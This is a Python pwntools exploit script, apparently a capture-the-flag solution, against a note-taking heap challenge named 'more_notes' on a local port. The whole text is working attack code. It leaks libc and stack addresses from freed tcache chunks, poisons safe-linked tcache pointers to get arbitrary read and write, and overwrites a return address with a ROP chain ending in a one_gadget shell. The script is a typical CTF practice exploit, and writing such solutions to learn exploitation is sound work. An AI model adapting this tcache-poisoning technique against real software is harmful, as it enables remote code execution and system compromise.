from pwn import *
# Create a remote or local process
def create_process():
    return remote('localhost', 37373)
    # return process('./more_notes')

def create_note(io, index):
    io.sendlineafter(b'> ', '1')
    io.sendlineafter(b'index: ', str(index))

def read_note(io, index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(index))
    return io.recv(144)  # Receive up to 0x90 bytes

def write_note(io, index, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(index))
    io.send(data)

def delete_note(io, index):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'index: ', str(index))

def get_id(io, index):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'index: ', str(index))
    return int(io.recvuntil('\n').decode().split()[1])

def set_id(io, index, new_id):
    io.sendlineafter(b'> ', b'6')
    io.sendlineafter(b'index: ', str(index))
    io.sendlineafter(b'new id: ', str(new_id))

def main():
    io = create_process()

    for i in range(9):
        create_note(io, i)
    for i in range(8):
        delete_note(io, i)
    # pause()
    libc = (get_id(io, 7) >> 12 << 12) - 0x203000
    print(hex(libc))
    environ = libc + 0x000000000020ad40
    heap1 = get_id(io, 0)
    print(hex(environ))
    # heap2 = get_id(io, 6)
    set_id(io, 6, heap1 ^ environ)
    create_note(io, 9)
    create_note(io, 10)
    # stack = get_id(io, 10)
    stack = int(read_note(io, 10)[0x10:0x18][::-1].hex(), 16)-0x158
    print(stack)
    delete_note(io, 8)
    delete_note(io, 9)
    set_id(io, 8, heap1 ^ (stack))
    create_note(io, 11)
    create_note(io, 12)
    create_note(io, 13)

    pause()
    pop_rcx = 0x00000000000a876e + libc
    pop_rbx = 0x00000000000586d4 + libc
    oneshot = 0x583e3 + libc
    write_note(io,0, p64(0) + p64(environ)+ p64(pop_rcx) + p64(0) + p64(pop_rbx) + p64(0) + p64(oneshot))

    # create_note(io, 11)

    io.interactive()
if __name__ == '__main__':
    main()